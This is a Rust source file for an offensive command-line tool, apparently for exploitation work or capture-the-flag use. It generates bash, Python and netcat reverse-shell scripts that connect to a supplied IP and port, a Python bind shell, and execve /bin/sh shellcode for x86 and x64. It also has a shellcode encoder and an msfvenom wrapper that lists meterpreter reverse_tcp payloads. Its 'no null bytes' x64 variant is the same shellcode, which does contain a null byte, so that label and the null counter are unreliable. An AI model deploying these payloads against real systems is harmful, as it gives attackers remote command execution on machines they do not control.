//! shell - shellcode/反弹shell生成器
//! 纯 Rust 生成 shellcode 与反弹shell脚本, msfvenom 模式调用外部 msfvenom

use clap::Parser;
use common::{exit, finish, Mode, Out};
use serde::Serialize;
use std::io::Write;
use std::process::{Command, ExitCode, Stdio};
use std::time::{Duration, Instant};

const DOC: &str = "pwn-shell: shellcode/reverse shell生成器
用法:
    pwn-shell --reverse <ip> <port>         # 反弹shell (bash)
    pwn-shell --reverse-raw <ip> <port>     # 反弹shell (raw TCP)
    pwn-shell --shellcode-x64              # x86_64 execve /bin/sh
    pwn-shell --shellcode-x86              # x86 execve /bin/sh
    pwn-shell --shellcode-x64-norestrict   # x86_64 (无空字节)
    pwn-shell --bind <port>                 # bindshell
    pwn-shell --encode <bytes>              # ASCII编码shellcode
    pwn-shell --msfvenom <payload> [opts]   # 调用msfvenom
    pwn-shell --list                        # 列出可用payloads
";

#[derive(Parser, Debug)]
#[command(
    name = "shell",
    version,
    about = "shellcode/反弹shell生成器",
    long_about = "用法:\n    shell --reverse <ip> <port>         # 反弹shell (bash)\n    shell --reverse-raw <ip> <port>     # 反弹shell (raw TCP)\n    shell --shellcode-x64               # x86_64 execve /bin/sh\n    shell --shellcode-x86               # x86 execve /bin/sh\n    shell --shellcode-x64-norestrict    # x86_64 (无空字节)\n    shell --bind <port>                 # bindshell\n    shell --encode <bytes>              # ASCII编码shellcode\n    shell --msfvenom <payload> [opts]   # 调用msfvenom\n    shell --list                        # 列出可用payloads",
    after_help = "退出码: 0=成功 1=无结果 2=用法错误 3=运行错误"
)]
struct Args {
    /// bash/python 反弹shell
    #[arg(long, num_args = 0..=2, value_names = ["IP", "PORT"])]
    reverse: Option<Vec<String>>,

    /// netcat 反弹shell (raw TCP)
    #[arg(long = "reverse-raw", num_args = 0..=2, value_names = ["IP", "PORT"])]
    reverse_raw: Option<Vec<String>>,

    /// x86_64 execve /bin/sh shellcode
    #[arg(long = "shellcode-x64")]
    shellcode_x64: bool,

    /// x86_64 execve /bin/sh shellcode (无空字节变体)
    #[arg(long = "shellcode-x64-norestrict")]
    shellcode_x64_norestrict: bool,

    /// x86 execve /bin/sh shellcode
    #[arg(long = "shellcode-x86")]
    shellcode_x86: bool,

    /// bindshell 脚本
    #[arg(long, num_args = 0..=1, default_missing_value = "4444", value_name = "PORT")]
    bind: Option<String>,

    /// ASCII编码 shellcode (hex)
    #[arg(long, value_name = "BYTES")]
    encode: Option<String>,

    /// 调用 msfvenom 生成 payload
    #[arg(long, num_args = 1.., value_name = "PAYLOAD", allow_hyphen_values = true)]
    msfvenom: Option<Vec<String>>,

    /// 列出可用 payloads
    #[arg(long)]
    list: bool,

    /// JSON 输出
    #[arg(long)]
    json: bool,
}

#[derive(Serialize)]
struct Payload {
    name: String,
    desc: String,
}

#[derive(Serialize)]
#[serde(tag = "command", rename_all = "kebab-case")]
enum Report {
    Reverse {
        ip: String,
        port: String,
        bash: String,
        python: String,
    },
    ReverseRaw {
        ip: String,
        port: String,
        script: String,
    },
    Shellcode {
        arch: String,
        variant: String,
        length: usize,
        hex: String,
        python_bytes: String,
        contains_null: bool,
        null_marker_count: usize,
    },
    Bind {
        port: String,
        script: String,
    },
    Encode {
        input: String,
        length: usize,
        encoded: String,
        encoded_hex: String,
    },
    Msfvenom {
        payload: String,
        opts: Vec<String>,
        success: bool,
        output_hex: String,
        stderr: String,
    },
    List {
        payloads: Vec<Payload>,
        msfvenom_examples: Vec<String>,
    },
}

fn reverse_shell_bash(ip: &str, port: &str) -> String {
    format!(
        "#!/bin/bash\n# Reverse shell - {ip}:{port}\nbash -i >& /dev/tcp/{ip}/{port} 0>&1\n"
    )
}

fn reverse_shell_python(ip: &str, port: &str) -> String {
    format!(
        "#!/usr/bin/env python3\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.connect((\"{ip}\",{port}))\nos.dup2(s.fileno(),0)\nos.dup2(s.fileno(),1)\nos.dup2(s.fileno(),2)\nsubprocess.call([\"/bin/bash\",\"-i\"])\n"
    )
}

fn reverse_shell_nc(ip: &str, port: &str) -> String {
    format!(
        "#!/bin/bash\n# nc反弹shell\nrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {ip} {port} >/tmp/f\n"
    )
}

fn bindshell(port: &str) -> String {
    format!(
        "#!/usr/bin/env python3\nimport socket,subprocess,os\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\ns.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\ns.bind((\"0.0.0.0\",{port}))\ns.listen(1)\nc,a=s.accept()\nos.dup2(c.fileno(),0)\nos.dup2(c.fileno(),1)\nos.dup2(c.fileno(),2)\nsubprocess.call([\"/bin/bash\",\"-i\"])\n"
    )
}

fn shellcode_x64() -> Vec<u8> {
    vec![
        0x48, 0x31, 0xf6, 0x56, 0x48, 0xbf, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x57,
        0x54, 0x5f, 0x6a, 0x3b, 0x58, 0x99, 0x0f, 0x05,
    ]
}

fn shellcode_x86() -> Vec<u8> {
    vec![
        0x31, 0xc0, 0x50, 0x68, 0x2f, 0x2f, 0x73, 0x68, 0x68, 0x2f, 0x62, 0x69, 0x6e, 0x89, 0xe3,
        0x50, 0x53, 0x89, 0xe1, 0xb0, 0x0b, 0xcd, 0x80,
    ]
}

fn encode_ascii_shellcode(sc: &[u8]) -> Vec<u8> {
    let mut result = Vec::new();
    for &b in sc {
        if (0x20..0x7f).contains(&b) && b != 0x27 {
            result.push(b);
        } else {
            result.extend_from_slice(format!("\\x{b:02x}").as_bytes());
        }
    }
    result
}

fn py_bytes_repr(data: &[u8]) -> String {
    let has_single = data.contains(&b'\'');
    let has_double = data.contains(&b'"');
    let quote = if has_single && !has_double { b'"' } else { b'\'' };
    let mut s = String::from("b");
    s.push(quote as char);
    for &b in data {
        match b {
            b'\\' => s.push_str("\\\\"),
            b'\t' => s.push_str("\\t"),
            b'\n' => s.push_str("\\n"),
            b'\r' => s.push_str("\\r"),
            0x20..=0x7e => {
                if b == quote {
                    s.push('\\');
                }
                s.push(b as char);
            }
            _ => s.push_str(&format!("\\x{b:02x}")),
        }
    }
    s.push(quote as char);
    s
}

fn parse_hex_bytes(s: &str) -> Result<Vec<u8>, String> {
    let cleaned = s.replace(' ', "").replace("\\x", "").replace("0x", "");
    if !cleaned.len().is_multiple_of(2) {
        return Err(format!("odd-length hex string: {s}"));
    }
    let mut out = Vec::with_capacity(cleaned.len() / 2);
    let bytes = cleaned.as_bytes();
    for i in (0..bytes.len()).step_by(2) {
        let hi = (bytes[i] as char)
            .to_digit(16)
            .ok_or_else(|| format!("invalid hex string: {s}"))?;
        let lo = (bytes[i + 1] as char)
            .to_digit(16)
            .ok_or_else(|| format!("invalid hex string: {s}"))?;
        out.push(((hi << 4) | lo) as u8);
    }
    Ok(out)
}

fn msfvenom_gen(out: &Out, payload: &str, opts: &[String]) -> Result<(), u8> {
    let mut cmd = Command::new("msfvenom");
    cmd.arg("-p").arg(payload).args(opts).arg("-f").arg("raw");
    cmd.stdin(Stdio::null())
        .stdout(Stdio::piped())
        .stderr(Stdio::piped());
    let mut child = match cmd.spawn() {
        Ok(c) => c,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
            out.error("msfvenom not found. Install metasploit-framework");
            return Err(exit::ERROR);
        }
        Err(e) => {
            out.error(&format!("msfvenom: {e}"));
            return Err(exit::ERROR);
        }
    };

    let mut stdout_pipe = child.stdout.take().expect("piped stdout");
    let mut stderr_pipe = child.stderr.take().expect("piped stderr");
    let t_out = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = std::io::Read::read_to_end(&mut stdout_pipe, &mut buf);
        buf
    });
    let t_err = std::thread::spawn(move || {
        let mut buf = Vec::new();
        let _ = std::io::Read::read_to_end(&mut stderr_pipe, &mut buf);
        buf
    });

    let start = Instant::now();
    let status = loop {
        match child.try_wait() {
            Ok(Some(st)) => break st,
            Ok(None) => {
                if start.elapsed() > Duration::from_secs(10) {
                    let _ = child.kill();
                    let _ = child.wait();
                    out.error("msfvenom timeout");
                    return Err(exit::ERROR);
                }
                std::thread::sleep(Duration::from_millis(50));
            }
            Err(e) => {
                let _ = child.kill();
                let _ = child.wait();
                out.error(&format!("msfvenom: {e}"));
                return Err(exit::ERROR);
            }
        }
    };

    let stdout = t_out.join().unwrap_or_default();
    let stderr = t_err.join().unwrap_or_default();
    let stderr_text = String::from_utf8_lossy(&stderr).to_string();
    let success = status.success();

    let report = Report::Msfvenom {
        payload: payload.to_string(),
        opts: opts.to_vec(),
        success,
        output_hex: stdout.iter().map(|b| format!("{b:02x}")).collect(),
        stderr: stderr_text.clone(),
    };

    out.emit(
        || {
            if success {
                let mut so = std::io::stdout();
                let _ = so.write_all(&stdout);
                let _ = so.flush();
                println!("[*] msfvenom output ({} bytes):", stdout.len());
                println!();
            } else {
                out.error(&format!("msfvenom error: {stderr_text}"));
            }
        },
        &report,
    );

    if success {
        Ok(())
    } else {
        Err(exit::ERROR)
    }
}

fn main() -> ExitCode {
    common::reset_sigpipe();
    // --msfvenom 允许带连字符的透传参数, 会吞掉后面的 --json, 因此先剥离
    let mut json = false;
    let argv: Vec<String> = std::env::args()
        .filter(|a| {
            if a == "--json" {
                json = true;
                false
            } else {
                true
            }
        })
        .collect();
    let args = Args::parse_from(argv);
    let out = Out::new(Mode::from_flag(args.json || json));

    let selected = [
        args.reverse.is_some(),
        args.reverse_raw.is_some(),
        args.shellcode_x64,
        args.shellcode_x64_norestrict,
        args.shellcode_x86,
        args.bind.is_some(),
        args.encode.is_some(),
        args.msfvenom.is_some(),
        args.list,
    ]
    .iter()
    .filter(|b| **b)
    .count();

    if selected == 0 {
        if out.json() {
            out.error("no command specified");
        } else {
            println!("{DOC}");
        }
        return finish(exit::USAGE);
    }
    if selected > 1 {
        out.error("参数冲突: 一次只能使用一个命令");
        return finish(exit::USAGE);
    }

    if let Some(v) = &args.reverse {
        let ip = v.first().cloned().unwrap_or_else(|| "127.0.0.1".into());
        let port = v.get(1).cloned().unwrap_or_else(|| "4444".into());
        let bash = reverse_shell_bash(&ip, &port);
        let python = reverse_shell_python(&ip, &port);
        let report = Report::Reverse {
            ip: ip.clone(),
            port: port.clone(),
            bash: bash.clone(),
            python: python.clone(),
        };
        out.emit(
            || {
                println!("[*] Reverse shell {ip}:{port}\n");
                println!("{bash}");
                println!("[*] Python alternative:\n");
                println!("{python}");
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(v) = &args.reverse_raw {
        let ip = v.first().cloned().unwrap_or_else(|| "127.0.0.1".into());
        let port = v.get(1).cloned().unwrap_or_else(|| "4444".into());
        let script = reverse_shell_nc(&ip, &port);
        let report = Report::ReverseRaw {
            ip: ip.clone(),
            port: port.clone(),
            script: script.clone(),
        };
        out.emit(
            || {
                println!("[*] Raw TCP reverse shell {ip}:{port}\n");
                println!("{script}");
            },
            &report,
        );
        return finish(exit::OK);
    }

    if args.shellcode_x64 || args.shellcode_x64_norestrict || args.shellcode_x86 {
        let (arch, variant, sc, title) = if args.shellcode_x64 {
            let sc = shellcode_x64();
            let title = format!("[*] x86_64 execve /bin/sh ({} bytes)", sc.len());
            ("x86_64", "restrict", sc, title)
        } else if args.shellcode_x64_norestrict {
            let sc = shellcode_x64();
            let title =
                format!("[*] x86_64 execve /bin/sh (no null bytes, {} bytes)", sc.len());
            ("x86_64", "norestrict", sc, title)
        } else {
            let sc = shellcode_x86();
            let title = format!("[*] x86 execve /bin/sh ({} bytes)", sc.len());
            ("x86", "x86", sc, title)
        };
        let hex = sc.iter().map(|b| format!("{b:02x}")).collect::<String>();
        let py = py_bytes_repr(&sc);
        let contains_null = sc.contains(&0);
        let null_marker_count = sc.windows(4).filter(|w| *w == b"\\x00").count();
        let report = Report::Shellcode {
            arch: arch.to_string(),
            variant: variant.to_string(),
            length: sc.len(),
            hex: hex.clone(),
            python_bytes: py.clone(),
            contains_null,
            null_marker_count,
        };
        out.emit(
            || {
                println!("{title}\n");
                println!("Hex: {hex}");
                println!("Python bytes: {py}");
                if contains_null && args.shellcode_x64 {
                    println!(
                        "[!] Contains {null_marker_count} null bytes, 用 --shellcode-x64-norestrict"
                    );
                }
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(port) = &args.bind {
        let script = bindshell(port);
        let report = Report::Bind {
            port: port.clone(),
            script: script.clone(),
        };
        out.emit(
            || {
                println!("[*] Bind shell on port {port}\n");
                println!("{script}");
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(hex_in) = &args.encode {
        let sc = match parse_hex_bytes(hex_in) {
            Ok(b) => b,
            Err(e) => {
                out.error(&e);
                return finish(exit::USAGE);
            }
        };
        let encoded = encode_ascii_shellcode(&sc);
        let report = Report::Encode {
            input: hex_in.clone(),
            length: encoded.len(),
            encoded: String::from_utf8_lossy(&encoded).to_string(),
            encoded_hex: encoded.iter().map(|b| format!("{b:02x}")).collect(),
        };
        out.emit(
            || {
                let mut so = std::io::stdout();
                let _ = so.write_all(&encoded);
                let _ = so.write_all(b"\n");
                let _ = so.flush();
                println!("[*] ASCII-encoded ({} bytes):", encoded.len());
            },
            &report,
        );
        return finish(exit::OK);
    }

    if let Some(v) = &args.msfvenom {
        let payload = v[0].clone();
        let opts = v[1..].to_vec();
        return match msfvenom_gen(&out, &payload, &opts) {
            Ok(()) => finish(exit::OK),
            Err(code) => finish(code),
        };
    }

    let payloads = vec![
        Payload {
            name: "reverse".into(),
            desc: "bash/python/nc反弹shell".into(),
        },
        Payload {
            name: "shellcode".into(),
            desc: "x86/x64 execve /bin/sh".into(),
        },
        Payload {
            name: "bind".into(),
            desc: "bindshell".into(),
        },
        Payload {
            name: "msfvenom".into(),
            desc: "调用msfvenom生成任意payload".into(),
        },
    ];
    let examples = vec![
        "linux/x64/execve=/bin/sh".to_string(),
        "linux/x64/meterpreter/reverse_tcp".to_string(),
        "linux/x86/execve=/bin/sh".to_string(),
        "linux/x86/meterpreter/reverse_tcp".to_string(),
    ];
    let report = Report::List {
        payloads,
        msfvenom_examples: examples,
    };
    out.emit(
        || {
            println!("[*] 可用 payloads:");
            println!("  reverse    - bash/python/nc反弹shell");
            println!("  shellcode  - x86/x64 execve /bin/sh");
            println!("  bind       - bindshell");
            println!("  msfvenom   - 调用msfvenom生成任意payload");
            println!("\n[*] 常用msfvenom payloads:");
            println!("  linux/x64/execve=/bin/sh");
            println!("  linux/x64/meterpreter/reverse_tcp");
            println!("  linux/x86/execve=/bin/sh");
            println!("  linux/x86/meterpreter/reverse_tcp");
        },
        &report,
    );
    finish(exit::OK)
}
